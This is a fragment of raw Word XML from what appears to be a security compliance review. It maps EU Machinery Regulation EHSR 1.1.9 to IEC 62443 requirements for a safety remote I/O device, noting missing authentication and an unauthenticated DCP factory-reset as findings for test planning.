        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP-via-999</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> point deferred from RQ-005, plus the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated DCP factory-reset</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> flagged in RQ-001 — all correctly belong to RQ-011 (who is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorized</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to change safety-relevant settings). </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>Confirmed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>retained</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8CA8DE" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Learning-phase clause over-reach (correct scope-down).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> In my original RQ-011 I discussed the "learning phase" as a mapping/rationale item. On recheck, the SRIO has </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no ML/adaptive/learning function</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, so the clause is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Not Applicable</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — but this is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>documentation/scoping statement (IEC 62443-4-1 SM-5)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a testable security control. I keep it as a </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>one-line N/A conformance note with rationale</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, and remove it from the CR mapping and test plan (it generated no test).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B371209" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DCP-reset boundary with RQ-010 (clarify).</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The DCP factory-reset is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated (authorization = RQ-011)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; its use as a </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flood/availability attack is RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. TC-RQ011-02 tests the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> aspect (can an unauthorized node issue it?); the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> aspect is cross-referenced to RQ-010.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABB9E62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>Everything else — the pivotal "password dropped" finding, the CCSC-2 delegated-authorization framing, the SRIO-3029 corroboration of the DCP hypothesis, and the param-end write-gate — was correct and is retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB821DF" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="6306BD02">
          <v:rect id="_x0000_i1752" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F81CAF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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D715A03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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10970946" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>AI/adaptive "learning phase"</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> clause. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">Core = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>access</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>control</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>safety</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">-relevant </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>setting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>rule</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>modification</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4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275"/>
        <w:gridCol w:w="1465"/>
        <w:gridCol w:w="3932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="5740D0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4B704A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1F80A8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Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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97623B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A049ED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Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="7C189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8E2CD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CR 1.1 – I&amp;A of human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1C051" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D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BC85A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Correct target, </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>not enforced on device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2183C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Device has no user authentication (password dropped, SRIO-8299).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="4FBEA8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F6BF0" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">CR 1.2 – I&amp;A </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>of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devices</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>processes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6CB1D4" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D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ECB1D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2DAC0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No device authentication on the fieldbus/DCP write path.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="6C0FE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70644" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">CR 2.1(2) – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>role-mapping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8553E" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D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AECA3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4FD22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Add CR 2.1 base</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (fundamental authorization enforcement), not only RE(2).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="5CB78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DC9B94" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>CR 3.4 – Software &amp; Information Integrity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95ACD" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D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D42BE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62574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The </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> integrity check is the only device-side control that touches this.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="71752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B7CE9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lastRenderedPageBreak/>
              <w:t>EDR 3.10 (authorization limb) — update access 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39942" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>received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from</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> RQ-005)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B7607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BF0E3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i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>"Who may perform the update"</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> = authorization. The physical gate (switch 999 + Update state) lives here.</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>(EDR 3.10 signature-verification limb stays at RQ-005.)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="600EF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0AABF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del w:id="31" w:author="Unknown">
              <w:r w:rsidRPr="00483B71">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>"Learning phase" as a mapped/testable item</w:delText>
              </w:r>
            </w:del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323D9" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E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31A17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N/A note (SM-5), not mapped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CD187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No ML/adaptive function → clause Not Applicable; documented rationale, no test.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38C863CB" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-011 → EHSR 1.1.9 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 1.1/1.2 [I&amp;A — absent, root cause], CR 2.1(+RE2) [authorization/purpose-limit — unmet], CR 3.4 [integrity check — the only device-side control], EDR 3.10 authorization limb [update access gate]}</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Learning-phase = N/A per SM-5; update signature verification → RQ-005; DCP flooding → RQ-010.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId269" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId270" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId271" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7AA940C7" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E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947"/>
        <w:gridCol w:w="6512"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="195B0F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2710EC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C106AC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Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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29E5A1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Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="623A3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27709" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">Asset B – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Safety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D8A49" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D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EC937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t>Correct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primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="562C1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00E76" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>Asset G – Operating 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7AA2C" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D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823A4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Correct — rotary/DIL switch (F-address + 999 update mode). </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Receives the update-gate analysis from RQ-005.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="1A046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BAC28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Asset F – Domain Separation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86AED" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E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ACB42" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep — the DCP reset is a </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>COM/PROFINET-side, Layer-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> action resetting communication parameters; the vector lives on the domain boundary. </w:t>
            </w:r>
            <w:hyperlink r:id="rId272" w:history="1">
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00D73D4E">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00D73D4E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3738667D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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
